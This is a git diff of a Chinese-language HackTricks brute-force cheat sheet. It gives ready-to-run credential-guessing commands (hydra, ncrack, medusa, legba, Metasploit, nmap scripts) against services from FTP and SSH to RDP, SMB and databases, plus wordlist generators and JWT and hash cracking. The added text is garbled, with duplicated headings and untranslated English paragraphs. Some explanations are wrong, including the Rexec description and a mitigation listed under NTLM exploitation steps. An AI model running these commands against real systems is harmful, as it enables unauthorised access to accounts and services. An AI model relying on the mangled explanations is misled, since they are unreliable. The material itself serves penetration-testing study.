@@ -1,30 +1,30 @@
-# 暴力破解 - 备忘单
+# 暴力破解 - 速查表
 
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进的**社区工具提供支持。\
+使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建和 **自动化工作流程**，使用世界上 **最先进** 的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>从零开始学习 AWS 黑客技术，成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-其他支持 HackTricks 的方式：
+支持 HackTricks 的其他方式：
 
-* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
+* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
 
 </details>
 
 ## 默认凭证
 
-在谷歌中**搜索**正在使用的技术的默认凭证，或**尝试以下链接**：
+在谷歌中搜索正在使用的技术的默认凭证，或者尝试以下链接：
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -41,7 +41,7 @@
 
 ## **创建您自己的字典**
 
-收集尽可能多的关于目标的信息，并生成自定义字典。可能有帮助的工具：
+尽可能多地了解目标的信息，并生成自定义字典。可能有用的工具：
 
 ### Crunch
 ```bash
@@ -55,18 +55,20 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 ### Cewl
+
+Cewl是一个用于生成自定义字典的工具。
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-根据你对受害者的了解（姓名、日期等）生成密码
+基于对受害者的了解（姓名、日期等）生成密码
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-一个词表生成工具，允许您提供一组单词，让您能够从给定的单词中制作出多种变体，创建一个独特且理想的词表，用于针对特定目标。
+一个字典生成工具，允许您提供一组单词，从给定的单词中创建多个变体，生成一个独特且理想的字典，以用于特定目标。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -103,14 +105,14 @@ Finished in 0.920s.
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
+使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建和**自动化工作流**，利用世界上**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## 服务
 
-按服务名称字母顺序排列。
+按服务名称按字母顺序排列。
 
 ### AFP
 ```bash
@@ -123,56 +125,51 @@ msf> set USER_FILE <PATH_USERS>
 msf> run
 ```
 ### AJP
+
+### AJP
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM 和 Solace)
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
 ### Cassandra
+
+#### Brute Force
+
+Brute force attacks against Cassandra typically involve trying to guess usernames and passwords to gain unauthorized access to the database. This can be done using automated tools that systematically try all possible combinations of usernames and passwords until the correct one is found. 
+
+To protect against brute force attacks, it is important to use strong, unique passwords and implement account lockout policies that lock out users after a certain number of failed login attempts. Additionally, enabling features like two-factor authentication can add an extra layer of security to prevent unauthorized access.
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
 ### CouchDB
+
+#### Brute Force
+
+Brute force attacks against CouchDB typically involve trying to guess valid user credentials by systematically checking all possible combinations of usernames and passwords. This can be done using automated tools that repeatedly make login attempts until the correct credentials are found. To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockout policies, and monitor login attempts for suspicious activity.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker 注册表
+### Docker Registry
+
+### Docker Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
+### Elasticsearch
+
 ### Elasticsearch
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
 
-FTP（文件传输协议）是一种用于在网络上交换文件的标准网络协议。黑客可能会尝试使用暴力破解方法来获取FTP服务器的访问权限。这通常涉及尝试大量的用户名和密码组合，直到找到有效的凭证。
-
-#### 工具和资源
-
-- **Hydra**: 这是一个快速的网络登录破解工具，支持多种协议，包括FTP。它可以进行并行字典攻击，使得破解过程更加高效。
-- **John the Ripper**: 这个工具通常用于破解密码哈希，但它也可以与其他工具结合使用来执行针对FTP的暴力破解攻击。
-- **Ncrack**: 专为网络服务设计的高速暴力破解工具，支持FTP。它旨在帮助公司进行安全性评估。
-
-#### 方法
-
-1. **收集信息**: 在尝试暴力破解之前，收集尽可能多的关于目标FTP服务器的信息。这可能包括用户名、IP地址和使用的FTP软件类型。
-2. **创建字典**: 根据收集到的信息，创建或获取可能的用户名和密码列表。这些列表也被称为“字典”。
-3. **配置工具**: 选择一个暴力破解工具并配置它，以便针对目标FTP服务器进行攻击。
-4. **执行攻击**: 使用工具对服务器进行暴力破解攻击，尝试登录。
-5. **分析结果**: 如果攻击成功，你将获得FTP服务器的访问权限。如果失败，分析结果并调整策略。
-
-#### 防御措施
-
-- **强密码策略**: 实施强密码策略，要求用户创建复杂且难以猜测的密码。
-- **账户锁定**: 设置账户在一定数量的失败登录尝试后自动锁定。
-- **多因素认证**: 启用多因素认证为FTP访问提供额外的安全层。
-- **监控和警报**: 监控FTP服务器的登录尝试，并在检测到可疑活动时发出警报。
+### FTP
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -183,7 +180,7 @@ legba ftp --username admin --password wordlists/passwords.txt --target localhost
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP 基本认证
+### HTTP基本身份验证
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -191,58 +188,49 @@ medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -
 legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
 ```
 ### HTTP - NTLM
+
+#### Brute Force
+
+##### Description
+
+NT LAN Manager (NTLM) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. Brute forcing NTLM hashes involves attempting all possible combinations of characters until the correct one is found.
+
+##### Detection
+
+Monitor authentication logs for multiple failed login attempts from the same source IP address. Look for patterns indicating systematic attempts to guess passwords.
+
+##### Exploitation
+
+1. Use tools like `Medusa` or `Hydra` to automate the brute force attack.
+2. Create custom wordlists based on known information about the target.
+3. Implement rate limiting on authentication attempts to prevent brute force attacks.
+
+##### Prevention
+
+1. Implement account lockout policies to lock out users after a certain number of failed login attempts.
+2. Use complex and unique passwords to make brute force attacks more difficult.
+3. Consider implementing multi-factor authentication to add an extra layer of security.
 ```bash
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post 表单
+### HTTP - Post Form
+
+### HTTP - 提交表单
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-### **HTTP - CMS --** (W)ordpress, (J)oomla 或 (D)rupal 或 (M)oodle
+对于http**s**，您必须从"http-post-form"更改为"**https-post-form"**
 
-对于 http**s**，您需要将 "http-post-form" 更改为 "**https-post-form"**
+### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
 
-IMAP（Internet Message Access Protocol）是一种电子邮件获取协议，它允许客户端从远程邮件服务器读取信息。攻击者可以利用IMAP进行暴力破解攻击，尝试猜测用户的邮箱密码。
-
-#### 工具
-
-以下是一些可以用于IMAP暴力破解的工具：
-
-- **Hydra** - 这是一个非常流行的网络暴力破解工具，支持多种协议，包括IMAP。
-- **nmap** - 通过其脚本引擎，nmap可以用来识别IMAP服务并尝试密码猜测。
-- **Metasploit** - 这个框架中包含了多个用于IMAP服务的暴力破解模块。
-
-#### 方法
-
-进行IMAP暴力破解时，可以遵循以下步骤：
-
-1. 确定目标邮箱服务器的IP地址和IMAP端口（通常是143或者加密的993）。
-2. 收集或生成可能的密码列表。
-3. 使用上述工具之一，配置好目标信息和密码列表，开始暴力破解。
-4. 分析结果，如果成功获取凭证，采取下一步行动。
-
-#### 防御
-
-为了防止IMAP暴力破解攻击，可以采取以下措施：
-
-- 启用账户锁定策略，多次登录失败后锁定账户。
-- 使用强密码，并定期更换。
-- 启用双因素认证。
-- 监控异常登录尝试，并及时响应。
-
-#### 资源
-
-- [OWASP Testing Guide on IMAP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Password_Policy/10-Testing_for_Weak_Security_Question_Answer)
-- [Hydra GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
-- [Nmap Scripting Engine](https://nmap.org/book/nse.html)
-- [Metasploit Framework](https://www.metasploit.com/)
+### IMAP
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -250,14 +238,22 @@ nmap -sV --script imap-brute -p <PORT> <IP>
 legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
+
+#### Brute Force
+
+Brute forcing IRC servers is a common technique used to gain unauthorized access. Attackers use automated tools to try a large number of username and password combinations until they find the correct one. This can be mitigated by enforcing strong password policies, implementing account lockout mechanisms, and monitoring for multiple failed login attempts.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
 ### ISCSI
+
+### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
-### JWT (JSON Web Token)
+### JWT
+
+JSON Web Tokens（JWT）是一种用于在网络应用之间传递声明的开放标准（RFC 7519）。JWT通常用于身份验证和信息交换。它由三部分组成：头部，载荷和签名。
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -281,16 +277,22 @@ python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1w
 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
 ### LDAP
+
+LDAP（轻型目录访问协议）是一种用于访问和维护分布式目录信息服务的协议。
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
+### MQTT
+
 ### MQTT
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
 ### Mongo
+
+Mongo是一种流行的NoSQL数据库，常用于Web应用程序。Brute force攻击Mongo数据库的常见方法包括使用常见的用户名和密码组合，以及使用自动化工具来尝试大量的凭据。保护Mongo数据库的方法包括使用强密码，限制远程访问，并定期监视日志以检测潜在的恶意活动。
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
@@ -298,10 +300,12 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-MSSQL（Microsoft SQL Server）是微软开发的一种关系数据库管理系统。它支持多种数据类型、复杂查询、事务处理、数据分析等功能。在渗透测试中，攻击者可能会尝试使用暴力破解方法来获取对MSSQL数据库的访问权限。这通常涉及尝试大量的用户名和密码组合，直到找到有效的凭证。
+### MSSQL
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
+### MySQL
+
 ### MySQL
 ```bash
 # hydra
@@ -316,6 +320,8 @@ medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on fir
 #Legba
 legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
+### OracleSQL
+
 ### OracleSQL
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
@@ -340,44 +346,17 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-为了使用 **patator** 中的 **oracle\_login**，你需要**安装**：
+为了使用**oracle\_login**和**patator**，您需要**安装**：
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[离线 OracleSQL 哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**版本 11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2** 和 **11.2.0.3**）：
+[离线 OracleSQL 哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**版本 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 和 **11.2.0.3**）:
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
 
-POP（邮局协议）是一种用于从远程服务器检索电子邮件的协议。黑客可以使用暴力破解攻击来尝试获取用户的POP凭证。这通常涉及尝试大量的用户名和密码组合，直到找到正确的一组为止。
-
-#### 工具
-
-- **Hydra** - 一个强大的登录破解工具，支持多种协议，包括POP。
-- **John the Ripper** - 一个著名的密码破解工具，可以用来破解多种加密的密码哈希。
-
-#### 方法
-
-1. 确定目标POP服务器的地址和端口。
-2. 收集可能的用户名列表。
-3. 准备或获取可能的密码列表。
-4. 使用工具进行暴力破解攻击。
-5. 分析结果，如果成功获取凭证，采取下一步行动。
-
-#### 防御
-
-- 启用账户锁定策略，以防止多次登录失败后的尝试。
-- 使用强密码，并定期更换。
-- 启用多因素认证。
-- 监控异常登录尝试。
-
-#### 资源
-
-- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
-- [John the Ripper website](https://www.openwall.com/john/)
-
-使用这些工具和方法时，请确保遵守当地法律和道德规范。未经授权的访问可能会导致法律后果。
+### POP
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -388,6 +367,8 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 # SSL
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
+### PostgreSQL
+
 ### PostgreSQL
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
@@ -400,34 +381,21 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-您可以从 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) 下载 `.deb` 包进行安装。
+您可以从[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)下载`.deb`软件包进行安装。
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 ### RDP
 
-Remote Desktop Protocol (RDP) 是一种由 Microsoft 开发的协议，允许用户通过网络连接到另一台计算机。攻击者经常尝试使用暴力破解方法来猜测 RDP 登录凭证，以获取对目标系统的远程访问权限。
-
-#### Brute-force Attack on RDP
-
-对 RDP 的暴力破解攻击涉及尝试多个用户名和密码组合，直到找到有效的凭证为止。这种方法可能会耗费大量时间，并且可能会在目标系统上触发安全警报。
-
-- 使用工具如 `Hydra` 或 `Ncrack` 可以自动化暴力破解过程。
-- 为了提高效率，攻击者可能会使用从数据泄露中获得的用户名列表和常见密码字典。
-- 防御措施包括启用账户锁定策略、使用复杂密码和启用多因素认证。
-
-#### Mitigation
-
-- 启用账户锁定策略以在多次失败尝试后锁定账户。
-- 使用复杂且唯一的密码。
-- 启用多因素认证增加额外的安全层。
-- 监控登录尝试并设置警报以检测异常活动。
+### 远程桌面协议
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
+### Redis
+
 ### Redis
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
@@ -437,58 +405,48 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 ```
 ### Rexec
 
-(Translation not required as per instructions)
+### Rexec
+
+Rexec is a simple service that allows remote command execution. It is often used for testing purposes to check if a system is vulnerable to command injection attacks. The basic idea behind Rexec is to send a command to the service and see if it gets executed on the remote system. This can be done using brute-force techniques to guess the correct command or parameters that will allow for successful execution.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Rlogin (remote login) 是一种允许用户在另一台计算机上登录的 UNIX 命令。这种技术可以被用来尝试通过暴力破解来获取对远程系统的访问。
-
-### Hydra
-
-Hydra 是一款流行的网络登录破解工具，支持多种协议，包括 Rlogin。它可以并发执行多个登录尝试，从而提高破解效率。
-
-### Medusa
-
-Medusa 类似于 Hydra，但它设计上更加模块化。它也支持 Rlogin 协议，并且可以用于执行暴力破解攻击。
-
-### Ncrack
-
-Ncrack 是一款高速网络认证破解工具，旨在帮助渗透测试者优化暴力破解攻击。它支持 Rlogin 协议，并且能够快速地进行密码破解尝试。
+### Rlogin
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
+
+### Rsh
+
+Rsh (Remote Shell) is a simple remote shell client included in Unix operating systems. It can be used to execute commands on a remote system. Rsh is often targeted during brute-force attacks due to its lack of encryption and authentication mechanisms. It is recommended to disable Rsh if not needed to prevent unauthorized access to systems.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
+
 ### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
 ```
 ### RTSP
 
-RTSP（实时流传输协议）是用于控制音频或视频流的网络控制协议。攻击者可以尝试使用暴力破解方法来获取未授权的访问权限。
+### RTSP
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
 ### SFTP
 
-SFTP（Secure File Transfer Protocol）是一种安全的文件传输协议，通常用于通过加密的连接传输文件。在尝试SFTP暴力破解时，可以使用以下方法：
-
-- **Hydra**：这是一个流行的网络暴力破解工具，支持多种协议，包括SFTP。使用Hydra时，你需要提供目标IP、用户名列表和密码列表。
-
-- **Ncrack**：这是另一个支持多协议的暴力破解工具，它可以用来破解SFTP。Ncrack的使用方式与Hydra类似，但它在速度和效率方面有所不同。
-
-- **Patator**：Patator是一个多用途的暴力破解工具，支持多种服务和协议，包括SFTP。它是Python编写的，可以通过自定义模块来扩展功能。
-
-在使用这些工具时，应该注意遵守法律法规，并确保有适当的授权。未经授权的访问可能会导致法律后果。
+SFTP（Secure File Transfer Protocol）是一种安全的文件传输协议，通常用于在网络上安全地传输文件。
 ```bash
 legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
 # Try keys from a folder
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
+### SNMP
+
 ### SNMP
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
@@ -497,17 +455,23 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
 ```
 ### SMB
+
+SMB (Server Message Block) is a protocol for sharing resources, such as files and printers, over a network. It is widely used in Windows networks. Brute-forcing SMB involves trying to guess usernames and passwords to gain unauthorized access to shared resources. This can be done using tools like Hydra or Metasploit.
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 ### SMTP
+
+SMTP（Simple Mail Transfer Protocol）是用于发送电子邮件的标准协议。
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
 legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
+### SOCKS
+
 ### SOCKS
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
@@ -515,7 +479,11 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL服务器
+### SQL Server
+
+#### Brute Force
+
+Brute force attacks against SQL Server involve attempting to guess usernames and passwords to gain unauthorized access. This can be done using automated tools that systematically try all possible combinations of usernames and passwords until the correct one is found. Brute force attacks can be time-consuming but are often successful if weak credentials are used. It is essential to use strong, complex passwords and implement account lockout policies to mitigate the risk of brute force attacks.
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -524,6 +492,8 @@ medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssq
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
 msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
 ```
+### SSH
+
 ### SSH
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
@@ -536,15 +506,17 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### 弱SSH密钥 / Debian可预测PRNG
 
-某些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间大幅减少，可以使用如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)等工具进行暴力破解。也有预生成的弱密钥集可用，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。
+一些系统在用于生成加密材料的随机种子中存在已知缺陷。这可能导致密钥空间大幅缩小，可以使用工具（如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)）对其进行暴力破解。还可以使用预生成的弱密钥集，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ)
+### STOMP（ActiveMQ、RabbitMQ、HornetQ和OpenMQ）
 
-STOMP文本协议允许与消息队列服务进行交互，如ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ。
+STOMP文本协议允许与消息队列服务（如ActiveMQ、RabbitMQ、HornetQ和OpenMQ）进行交互。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
 ### Telnet
+
+Telnet是一种用于远程登录的协议，通常用于在网络上的设备之间进行通信。 Telnet暴力破解是一种尝试使用大量可能的用户名和密码组合来访问Telnet服务器的方法。攻击者可以使用自动化工具来尝试这些组合，以获取未经授权的访问权限。为了防止Telnet暴力破解攻击，建议使用强密码，并限制登录尝试次数以防止暴力破解。
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -559,6 +531,8 @@ legba telnet \
 --telnet-prompt ":~$ " \
 --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
 ```
+### VNC
+
 ### VNC
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
@@ -575,26 +549,36 @@ set RHOSTS <ip>
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
 ### Winrm
+
+### Winrm
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+\
+使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建和**自动化**由全球**最先进**的社区工具驱动的工作流程。\
+立即获取访问权限：
+
+{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+
 ## 本地
 
 ### 在线破解数据库
 
-* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?)（MD5 & SHA1）
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php)（MSCHAPv2/PPTP-VPN/NetNTLMv1 带/不带 ESS/SSP 以及任意挑战值）
-* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com)（哈希值、WPA2 抓包和 MSOffice、ZIP、PDF 归档文件）
-* [https://crackstation.net/](https://crackstation.net)（哈希值）
-* [https://md5decrypt.net/](https://md5decrypt.net)（MD5）
-* [https://gpuhash.me/](https://gpuhash.me)（哈希值和文件哈希值）
-* [https://hashes.org/search.php](https://hashes.org/search.php)（哈希值）
-* [https://www.cmd5.org/](https://www.cmd5.org)（哈希值）
